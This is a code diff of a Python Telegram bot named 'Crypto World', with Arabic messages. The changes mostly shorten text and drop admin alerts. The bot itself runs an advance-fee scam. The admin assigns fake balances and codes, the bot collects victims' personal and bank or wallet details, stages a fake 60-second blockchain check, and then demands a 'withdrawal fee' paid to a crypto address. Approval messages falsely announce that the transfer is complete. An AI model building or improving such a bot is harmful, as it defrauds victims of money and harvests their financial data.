@@ -45,7 +45,7 @@ def load_data():
             "network": "BNB Smart Chain (BEP20)",
             "address": "0x4aaf2231199d24842e606f99b4f69bb5cddb171e"
         },
-        "user_fees": {},  # لحفظ رسوم السحب المخصصة لكل مستخدم عبر الـ ID
+        "user_fees": {},  # الرسوم الخاصة لكل مستخدم عبر الـ ID
         "all_users": []
     }
 
@@ -91,7 +91,7 @@ def estimate_account_age(user_id: int) -> str:
     else:
         return "حساب حديث نسبياً (وتم إنشاؤه في السنوات الأخيرة)"
 
-# أمر الأدمن لتعديل رسوم السحب العامة للجميع: /setwithdrawfee
+# أمر الأدمن للرسوم العامة: /setwithdrawfee
 async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -106,26 +106,15 @@ async def set_withdraw_fee_command(update: Update, context: ContextTypes.DEFAULT
         )
         return
 
-    amount = args[0]
-    currency = args[1].upper()
-    network = args[2]
-    address = " ".join(args[3:])
-
-    withdraw_fee_info["amount"] = amount
-    withdraw_fee_info["currency"] = currency
-    withdraw_fee_info["network"] = network
-    withdraw_fee_info["address"] = address
+    withdraw_fee_info["amount"] = args[0]
+    withdraw_fee_info["currency"] = args[1].upper()
+    withdraw_fee_info["network"] = args[2]
+    withdraw_fee_info["address"] = " ".join(args[3:])
     save_data_to_file()
 
-    await update.message.reply_text(
-        f"✅ **تم تحديث رسوم السحب العامة بنجاح!**\n\n"
-        f"• المبلغ: `{amount} {currency}`\n"
-        f"• البنك / الشبكة: `{network}`\n"
-        f"• الحساب / العنوان:\n`{address}`",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text("✅ **تم تحديث الرسوم العامة بنجاح!**", parse_mode="Markdown")
 
-# أمر الأدمن لتخصيص رسوم سحب لمستخدم معين بالـ ID: /setuserfee
+# أمر الأدمن لتخصيص رسوم مستخدم بالـ ID: /setuserfee
 async def set_user_fee_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
@@ -163,55 +152,33 @@ async def set_user_fee_command(update: Update, context: ContextTypes.DEFAULT_TYP
         parse_mode="Markdown"
     )
 
-# أمر الأدمن للإذاعة لجميع المستخدمين: /broadcast
+# أمر الإذاعة للجميع: /broadcast
 async def broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
 
     text_to_send = " ".join(context.args)
     if not text_to_send:
-        await update.message.reply_text(
-            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
-            "اكتب الأمر بهذا الشكل:\n"
-            "`/broadcast <الرسالة>`",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("⚠️ اكتب الرسالة بعد الأمر `/broadcast`", parse_mode="Markdown")
         return
-
-    success_count = 0
-    fail_count = 0
-
-    status_msg = await update.message.reply_text("🚀 جاري إرسال الرسالة لجميع المستخدمين...")
 
     for uid in list(all_users_set):
         try:
             await context.bot.send_message(chat_id=int(uid), text=text_to_send, parse_mode="Markdown")
-            success_count += 1
             await asyncio.sleep(0.05)
         except Exception as e:
-            fail_count += 1
             logger.error(f"فشل الإرسال للمستخدم {uid}: {e}")
 
-    await status_msg.edit_text(
-        f"📊 **تقرير الإذاعة:**\n\n"
-        f"• تم الإرسال بنجاح إلى: `{success_count}` مستخدم\n"
-        f"• فشل الإرسال إلى: `{fail_count}` مستخدم",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text("✅ تم إرسال الإذاعة بنجاح.", parse_mode="Markdown")
 
-# أمر الأدمن لتحديد الرصيد وكود التحقق لمستخدم معين: /setprofit
+# أمر تحديد رصيد وأكواد المستخدم: /setprofit
 async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
 
     args = context.args
     if len(args) < 3:
-        await update.message.reply_text(
-            "⚠️ **طريقة الاستخدام غير صحيحة!**\n"
-            "اكتب الأمر بهذا الشكل:\n"
-            "`/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`",
-            parse_mode="Markdown"
-        )
+        await update.message.reply_text("⚠️ الاستخدام: `/setprofit <معرف_المستخدم> <المبلغ> <رقم_التحقق>`", parse_mode="Markdown")
         return
 
     target_user_id = args[0].strip()
@@ -224,25 +191,15 @@ async def set_profit(update: Update, context: ContextTypes.DEFAULT_TYPE):
     }
     save_data_to_file()
 
-    await update.message.reply_text(
-        f"✅ **تم تخصيص الرصيد ورقم التحقق بنجاح!**\n\n"
-        f"• معرف المستخدم: `{target_user_id}`\n"
-        f"• الرصيد المتاح: `{amount} SAR`\n"
-        f"• رقم التحقق الخاص به: `{code}`",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text(f"✅ تم تخصيص رصيد `{amount} SAR` وكود التحقق `{code}` للمستخدم `{target_user_id}` بنجاح.", parse_mode="Markdown")
 
-# أمر عرض الأكواد للأدمن
 async def admin_get_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
         return
     codes_str = ", ".join([f"{code} (مبلغ: {data['amount']})" for code, data in custom_profits.items()])
-    await update.message.reply_text(
-        f"🔑 **أكواد التحقق الدائمة الفعّالة حالياً:**\n`{codes_str}`",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text(f"🔑 **الأكواد الفعّالة:**\n`{codes_str}`", parse_mode="Markdown")
 
-# أمر /start الترحيبي
+# أمر البدء الترحيبي
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
@@ -261,13 +218,9 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"الرجاء إرسال تفاصيل بياناتك صحيحة ليتم التعرف عليك في النظام وتفعيل حسابك."
     )
     
-    await update.message.reply_text(
-        welcome_msg, 
-        parse_mode="Markdown",
-        reply_markup=ReplyKeyboardRemove()
-    )
+    await update.message.reply_text(welcome_msg, parse_mode="Markdown", reply_markup=ReplyKeyboardRemove())
 
-# معالجة الصور (إيصالات الدفع)
+# معالجة الصور (الإيصالات)
 async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
@@ -279,12 +232,7 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     photo = update.message.photo[-1]
-
-    await update.message.reply_text(
-        "📸 **تم استلام صورة الوصل (الإيصال) بنجاح!**\n\n"
-        "جاري مراجعة وتأكيد عملية دفع الرسوم من قبل الإدارة. شكراً لك!",
-        parse_mode="Markdown"
-    )
+    await update.message.reply_text("📸 **تم استلام صورة الوصل بنجاح!**\nجاري مراجعة وتأكيد العملية من قبل الإدارة.", parse_mode="Markdown")
 
     keyboard = [
         [
@@ -295,22 +243,15 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
 
     admin_caption = (
-        "📥 **إيصال دفع رسوم سحب جديد تم رفعه من مستخدم في (عالم الكريبتو)!**\n\n"
+        "📥 **إيصال دفع رسوم سحب جديد في (عالم الكريبتو)!**\n\n"
         f"👤 اسم المستثمر: {user.first_name}\n"
         f"🆔 معرف المستخدم: `{user.id}`\n"
-        f"🔗 يوزر الحساب: {username}\n\n"
-        "يرجى مراجعة الإيصال والضغط على أحد الأزرار أدناه:"
+        f"🔗 يوزر الحساب: {username}"
     )
     try:
-        await context.bot.send_photo(
-            chat_id=ADMIN_ID, 
-            photo=photo.file_id, 
-            caption=admin_caption, 
-            reply_markup=reply_markup,
-            parse_mode="Markdown"
-        )
+        await context.bot.send_photo(chat_id=ADMIN_ID, photo=photo.file_id, caption=admin_caption, reply_markup=reply_markup, parse_mode="Markdown")
     except Exception as e:
-        logger.error(f"فشل إرسال صورة إيصال الرسوم للأدمن: {e}")
+        logger.error(f"فشل إرسال الإيصال للأدمن: {e}")
 
 # معالجة الرسائل النصية
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -321,12 +262,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
     all_users_set.add(user_id)
-    username = f"@{user.username}" if user.username else "بدون معرف"
     text = msg.text.strip()
     current_state = user_states.get(user_id)
 
     if current_state == "completed":
-        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار. يمكنك التواصل مع الدعم الفني.")
+        await msg.reply_text("لقد أكملت الإجراءات بالفعل ولا داعي للتكرار.")
         return
 
     if current_state == "waiting_for_subscription_text":
@@ -334,10 +274,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_custom_data[user_id] = text
             user_states[user_id] = "waiting_for_code"
             save_data_to_file()
-            
             await msg.reply_text("✅ تم استقبال بيانات التسجيل بنجاح.\n\nالرجاء إرسال **رقم تحقق الاشتراك** الخاص بك لتتمكن من رؤية رصيدك المتاح:")
         else:
-            await msg.reply_text("❌ عذراً، الصيغة المرسلة غير صحيحة. الرجاء إرسال تفاصيل بياناتك كاملة وصحيحة ليتم قبولها في النظام.")
+            await msg.reply_text("❌ عذراً، الصيغة المرسلة غير صحيحة. الرجاء إرسال تفاصيل بياناتك كاملة وصحيحة.")
         return
 
     if current_state == "waiting_for_bank_account":
@@ -351,21 +290,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             ]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
-
-        await msg.reply_text(
-            "💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\n"
-            "الرجاء إرسال تفاصيل حسابك أو محفظتك في رسالة هنا ليتم ربطها بطلب السحب:",
-            reply_markup=reply_markup,
-            parse_mode="Markdown"
-        )
+        await msg.reply_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nالرجاء إرسال تفاصيل حسابك أو محفظتك في رسالة هنا:", reply_markup=reply_markup, parse_mode="Markdown")
         
         await context.bot.send_message(
             chat_id=ADMIN_ID,
-            text=(
-                "🏦 **تم إدخال الحساب البنكي من قبل مستخدم!**\n\n"
-                f"• معرف المستخدم: `{user.id}` ({username})\n"
-                f"• تفاصيل الحساب البنكي:\n{text}"
-            ),
+            text=f"🏦 **تم إدخال الحساب من المستخدم `{user.id}`:**\n{text}",
             parse_mode="Markdown"
         )
         return
@@ -376,42 +305,24 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             assigned_id = code_info["assigned_user_id"]
             
             if assigned_id is not None and assigned_id != int(user_id):
-                await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك ولا يمكنك استخدامه.")
+                await msg.reply_text("❌ عذراً، رقم التحقق هذا غير مخصص لحسابك.")
                 return
 
             profit_amount = code_info["amount"]
-
             user_states[user_id] = "viewing_balance"
             save_data_to_file()
 
-            await context.bot.send_message(
-                chat_id=ADMIN_ID,
-                text=(
-                    "🔑 **تم استخدام رقم التحقق بنجاح (الكود مستمر ولا يحترق):**\n\n"
-                    f"• الرقم المستخدم: `{text}`\n"
-                    f"• بواسطة المستخدم: `{user.id}` ({username})"
-                ),
-                parse_mode="Markdown"
-            )
-
-            keyboard = [
-                [InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]
-            ]
+            keyboard = [[InlineKeyboardButton("💳 ادخل حسابك البنكي", callback_data="enter_bank_account")]]
             reply_markup = InlineKeyboardMarkup(keyboard)
-
             user_specific_data = user_custom_data.get(user_id, text)
 
             await msg.reply_text(
-                text=(
-                    "✅ **تم التحقق من رقم التحقق بنجاح!**\n\n"
-                    f"💰 **رصيدك المتاح:** `{profit_amount} SAR`\n\n"
-                    f"إليك بياناتك المسجلة:\n\n{user_specific_data}"
-                ),
+                text=f"✅ **تم التحقق بنجاح!**\n\n💰 **رصيدك المتاح:** `{profit_amount} SAR`\n\nإليك بياناتك المسجلة:\n\n{user_specific_data}",
                 reply_markup=reply_markup,
                 parse_mode="Markdown"
             )
         else:
-            await msg.reply_text("❌ رقم التحقق غير صحيح. يرجى مراجعة الدعم الفني للحصول على رقم صحيح.")
+            await msg.reply_text("❌ رقم التحقق غير صحيح.")
         return
 
 # معالجة الأزرار التفاعلية
@@ -420,7 +331,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.answer()
     
     data = query.data  
-    chat_id = query.message.chat_id
     user = query.from_user
     user_id = str(user.id)
     all_users_set.add(user_id)
@@ -429,7 +339,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if data.startswith("admin_approve_") or data.startswith("admin_reject_"):
         if user.id != ADMIN_ID:
-            await query.answer("هذا الإجراء مخصص للأدمن فقط!", show_alert=True)
+            await query.answer("هذا الإجراء للأدمن فقط!", show_alert=True)
             return
 
         parts = data.split("_")
@@ -438,69 +348,37 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         if action == "approve":
             try:
-                await context.bot.send_message(
-                    chat_id=target_user_id,
-                    text="✅ **تهانينا! تم تأكيد الدفع وعملية سحب رصيدك بنجاح في (عالم الكريبتو).** جاري تحويل المبلغ إلى حسابك.",
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                logger.error(f"فشل إرسال رسالة القبول للزبون: {e}")
-
-            await query.edit_message_caption(
-                caption=query.message.caption + "\n\n✅ **[تمت الموافقة على الدفع وتأكيد السحب]**",
-                parse_mode="Markdown"
-            )
+                await context.bot.send_message(chat_id=target_user_id, text="✅ **تهانينا! تم تأكيد السحب وتحويل المبلغ إلى حسابك بنجاح.**", parse_mode="Markdown")
+            except:
+                pass
+            await query.edit_message_caption(caption=query.message.caption + "\n\n✅ **[تمت الموافقة وتأكيد السحب]**", parse_mode="Markdown")
 
         elif action == "reject":
             try:
-                await context.bot.send_message(
-                    chat_id=target_user_id,
-                    text="❌ **عذراً، لم تقم بدفع المبلغ أو تم رفض العملية.** يرجى التأكد وإعادة المحاولة.",
-                    parse_mode="Markdown"
-                )
-            except Exception as e:
-                logger.error(f"فشل إرسال رسالة الرفض للزبون: {e}")
-
-            await query.edit_message_caption(
-                caption=query.message.caption + "\n\n❌ **[تم رفض العملية ولم يتم دفع المبلغ]**",
-                parse_mode="Markdown"
-            )
+                await context.bot.send_message(chat_id=target_user_id, text="❌ **عذراً، تم رفض العملية.** يرجى مراجعة الدعم.", parse_mode="Markdown")
+            except:
+                pass
+            await query.edit_message_caption(caption=query.message.caption + "\n\n❌ **[تم رفض العملية]**", parse_mode="Markdown")
         return
 
     if data == "enter_bank_account":
         user_states[user_id] = "waiting_for_bank_account"
         save_data_to_file()
-        await query.edit_message_text(
-            "💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\n"
-            "الرجاء إرسال تفاصيل حسابك أو محفظتك في رسالة هنا ليتم ربطها بطلب السحب:",
-            parse_mode="Markdown"
-        )
+        await query.edit_message_text("💳 **إدخال الحساب البنكي / محفظة الاستلام:**\n\nأرسل تفاصيل حسابك أو محفظتك في رسالة هنا:", parse_mode="Markdown")
 
     elif data == "withdraw_cancel":
         user_states[user_id] = "completed"
         save_data_to_file()
         await query.edit_message_text("تم الإلغاء بنجاح")
-        await context.bot.send_message(
-            chat_id=ADMIN_ID,
-            text=f"⚠️ تنبيه: قام المستخدم بإلغاء السحب!\n\n• معرف المستخدم: `{user.id}`\n• اليوزر: {username}",
-            parse_mode="Markdown"
-        )
 
     elif data == "withdraw_confirm":
         user_states[user_id] = "completed"
         save_data_to_file()
-        
-        await query.edit_message_text(
-            "⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع شبكة البلوكشين والنظام المالي...**\n\n"
-            "الرجاء الانتظار (مهلة التحقق: 60 ثانية)...",
-            parse_mode="Markdown"
-        )
+        await query.edit_message_text("⏳ **جاري التحقق من عملية السحب وتأكيد البيانات مع البلوكشين...**\n\nالرجاء الانتظار (60 ثانية)...", parse_mode="Markdown")
         
         await asyncio.sleep(60)
 
-        keyboard = [
-            [InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]
-        ]
+        keyboard = [[InlineKeyboardButton("💳 دفع", callback_data="pay_fees")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
 
         await query.edit_message_text(
@@ -508,15 +386,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             reply_markup=reply_markup,
             parse_mode="Markdown"
         )
-        
-        await context.bot.send_message(
-            chat_id=ADMIN_ID,
-            text=f"✅ تنبيه: قام المستخدم بتأكيد السحب وانتهت مهلة 60 ثانية (وظهرت له رسالة دفع الرسوم)!\n\n• معرف المستخدم: `{user.id}`\n• اليوزر: {username}",
-            parse_mode="Markdown"
-        )
 
     elif data == "pay_fees":
-        # التحقق مما إذا كان للمستخدم رسوم مخصصة عبر الـ ID الخاص به، وإذا لم توجد نستخدم الرسوم العامة
+        # جلب الرسوم الخاصة بهذا المستخدم إن وجدت، أو استخدام الرسوم العامة الافتراضية
         fee_data = user_specific_fees.get(user_id, withdraw_fee_info)
         
         pay_details = (
@@ -528,14 +400,11 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"`{fee_data['address']}`\n\n"
             "يرجى تحويل مبلغ الرسوم المطلوبة، ثم إرسال صورة الوصل (Screenshot) هنا في المحادثة ليتم تأكيد سحبك بنجاح."
         )
-        await query.edit_message_text(
-            pay_details,
-            parse_mode="Markdown"
-        )
+        await query.edit_message_text(pay_details, parse_mode="Markdown")
 
 def main():
     if not TOKEN:
-        raise ValueError("❌ خطأ: لم يتم تعيين التوكن في الكود!")
+        raise ValueError("❌ خطأ: لم يتم تعيين التوكن!")
         
     app = ApplicationBuilder().token(TOKEN).build()
 
@@ -543,13 +412,13 @@ def main():
     app.add_handler(CommandHandler("codes", admin_get_codes))
     app.add_handler(CommandHandler("setprofit", set_profit))
     app.add_handler(CommandHandler("broadcast", broadcast_message))
-    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))  # الرسوم العامة
-    app.add_handler(CommandHandler("setuserfee", set_user_fee_command))        # الرسوم الخاصة لكل مستخدم عبر الـ ID
+    app.add_handler(CommandHandler("setwithdrawfee", set_withdraw_fee_command))
+    app.add_handler(CommandHandler("setuserfee", set_user_fee_command))  # أمر تخصيص رسوم المستخدم بالـ ID
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
     app.add_handler(CallbackQueryHandler(button_handler))
 
-    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة مع نظام الرسوم المخصصة لكل مستخدم...")
+    print("🤖 بوت (عالم الكريبتو | Crypto World) يعمل بكفاءة تامة...")
     app.run_polling()
 
 if __name__ == "__main__":
